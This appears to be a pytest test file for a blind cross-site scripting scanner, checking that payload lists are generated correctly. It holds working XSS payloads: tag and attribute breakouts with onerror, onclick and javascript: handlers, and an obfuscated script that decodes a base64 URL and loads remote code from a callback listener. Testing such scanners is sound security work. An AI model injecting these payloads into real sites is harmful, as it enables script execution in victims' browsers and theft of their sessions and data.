import pytest
from ava.blinds.xss import CrossSiteScriptingBlindDirectCheck, CrossSiteScriptingBlindDynamicCheck


class TestCrossSiteScriptingBlindDirectCheck:
    payloads = [
        '<img src="http://localhost:8080/">',
        '"><img src="http://localhost:8080/"><"',
        '<script src="http://localhost:8080/"></script>',
        '"><script src="http://localhost:8080/"></script><"',
    ]

    @pytest.fixture
    def check(self):
        listener = "http://localhost:8080/"
        return CrossSiteScriptingBlindDirectCheck(listener)

    def test_init(self, check):
        assert check._payloads == self.payloads

    def test_check_payloads(self, check):
        payloads = ['<img src="{}">']
        correct = ['<img src="http://localhost:8080/">']
        assert correct == check._check_payloads(payloads)


class TestCrossSiteScriptingBlindDynamicCheck:
    payloads = [
        '<script>{}</script>',
        '"><script>{}</script><"',
        '<img src="x:#" onerror="{}">',
        '"><img src="x:#" onerror="{}"><"',
        '" onmouseover="{}',
        '#" onclick="{}',
        'javascript:(function(){{{}}})()',
        "';{}//'",
        '";{}//"'
    ]

    @pytest.fixture
    def check(self):
        listener = "http://localhost:8080/"
        return CrossSiteScriptingBlindDynamicCheck(listener)

    def test_init(self, check):
        encoded = "aHR0cDovL2xvY2FsaG9zdDo4MDgwLw=="
        script = "s=document.createElement('script');s.src=atob('{}');document.head.appendChild(s);".format(encoded)

        # init
        generated = [payload.format(script) for payload in self.payloads]
        test = check._payloads
        assert test == generated

    def test_check_payloads(self, check):
        payloads = ["<script>{}</script>"]
        correct = ["<script>s=document.createElement('script');s.src=atob('aHR0cDovL2xvY2FsaG9zdDo4MDgwLw==');document.head.appendChild(s);</script>"]
        assert correct == check._check_payloads(payloads)

